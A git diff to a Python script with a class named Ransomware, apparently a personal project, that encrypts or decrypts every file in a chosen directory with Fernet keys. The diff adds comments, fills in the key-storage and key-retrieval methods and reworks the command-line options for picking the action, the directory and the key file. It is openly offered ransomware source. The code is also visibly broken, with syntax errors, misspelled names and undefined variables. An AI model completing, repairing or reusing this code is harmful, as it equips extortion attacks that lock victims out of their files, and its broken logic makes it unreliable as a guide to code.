@@ -109,10 +109,13 @@ class Ransomware:
 		'''
 
 		progress_bar_info = ''
-
+		# --> If the action variable is set to encrypt
 		if action = 'encrypt':
+			# --> Set the progress bar title to the following
 			progress_bar_info = 'Encrypting files'
+		# --> If the action variable is set to decrypt
 		else:
+			# --> Set the progress bar title to the following
 			progress_bar_info = 'Decrypting files'
 
 		for file in tqdm(list_of_files,desc=progress_bar_info):
@@ -134,33 +137,32 @@ class Ransomware:
 					f.write(decrypted)
 
 
-	def store_key(self, keyfile, key_to_store):
+	def store_key(self):
 		'''
 		$ Store key in file
 		'''
-
 		print('[+] Storing key in file')
-		pass
-	
+		#
+		with open(keyfile,'wb') as f:
+			f.write(self.key)
+
+
 	def get_key(self):
 		'''
 		$ Retrieve a key from a file
 		'''
-
-		print('[+] Retrieving key from file')
-		pass
+		self.key = open(self.keyfile,'r').read()
 	
 	def key_gen_fernet_instance(self):
 		'''
 		$ Generate encryption/decryption key
 		$ Instantiate Fernet object
 		'''
-
-		print('Generating Fernet key')
+		print('[+] Generating Fernet key')
 		# --> Generating key for encryption
 		self.key = Fernet(Fernet.generate_key())
 
-		self.store_key(self.keyfile, self.key)
+		self.store_key()
 		# --> Fernet object instantiation
 		try:
 			# --> create Fernet object
@@ -169,11 +171,11 @@ class Ransomware:
 			# --> if it fails
 			print('[-] Unable to instantiate Fernet object for encryption')
 
+
 	def encrypt(self, to_encrypt):
 		'''
 		$ Encrypting all files in the directory stored in the directory variable
 		'''
-
 		print('[+] Encrypting all files in ' + self.directory + ' directory')
 
 		# --> Return the encrypted version of the contents of a file
@@ -184,48 +186,61 @@ class Ransomware:
 		'''
 		$ Decrypt all files in the directory stored in the directory variable
 		'''
-
 		print('[+] Decrypting all files in ' + self.directory + ' directory')
 		# --> Return the decrypted data of an encrypted file
 		return self.linear_b.decrypt(to_decrypt)
 
-'''
-******************
--------MAIN-------
-******************
-'''
+#%%%%%%%%% End Ransomware Class
+
 def parse_arguments():
-	# --> parsing arguments
-	parser = argpase.ArgumentParser(usage=f'usage: {sys.argv[0]} [-e] [-d] [-p] [-k]',
+	# --> Instantiate object for parsing arguments
+	parser = argpase.ArgumentParser(usage=f'usage: {sys.argv[0]} [-a] [-d] [-k]',
 									description='Passing arguments for our ransomware class')
-
+	# --> Create a group for arguments that are required
 	required = parser.add_argument_group('Required arguments')
-
+	# --> Create a group for argumetns that are optional
 	optional = parser.add_argument_group('Optional arguments')
-
-	optional.add_argument('-a', '--action',dest=action, help='Encrypt files', 
-						  action='store_true')
-
-	optional.add_argument('-k', '--keyfile', dest=keyfile, type=str, 
-						  help='Enter the name of the file with encryption/decryption key')
-
+	# --> This argument will define the cryption action (decrypt/encrypt)
+	optional.add_argument('-a', '--action', dest=action, type=str, 
+						  help='Encrypt or decrypt files files',
+						  required=True, default='encrypt')
+	# --> This argument will define the absolute path to a file that has a key
+	# --> or will be used to store a key
+	optional.add_argument('-k', '--keyfile', dest=keyfile, type=str,
+						  help='Enter the fullpath of a file with the encryption/decryption key',
+						  default=None)
+	# --> This argument will define the directory that will be encrypted or decrypted
 	parser.add_argument('-d', '--directory', dest=directory, type=str, 
 						help='Directory of files to encrypt or decrypt',
 						required=True)
-
+	# --> Retrieve arguments that were passed 
 	args = parser.parse_args()
 	print(args)
+	# --> return the arguments that were passed 
 
 def signature():
-	result = pyfiglet.figlet_format("BinexisHATT", font = "isometric1" ) 
+	# --> creating ASCII art
+	result = pyfiglet.figlet_format("BinexisHATT", font="isometric1" ) 
 	print(result) 
 
+'''
+**************************************
+-----------------MAIN-----------------
+**************************************
+'''
 def initiate()
+	# --> Print my signature
 	signature()
-	# --> get arguments
+	# --> Get arguments
 	directory, action, keyfile = parse_arguments()
-	# --> Instantiating Ransomware object
-	instance = Ransonware(directory=directory,keyfile=keyfile,action=action)
+	# --> If no key file was passed, use the default 
+	if keyfile == None:
+		# -->  Instantiate Ransomware object with no key file
+		instance = Ransonware(directory=directory,action=action)
+	# --> If keyfile is passed
+	else:
+		# --> Instantiate Ransomware object with key file
+		instance = Ransonware(directory=directory,keyfile=keyfile,action=action)
 
 
 # --> Check if the current module is main module
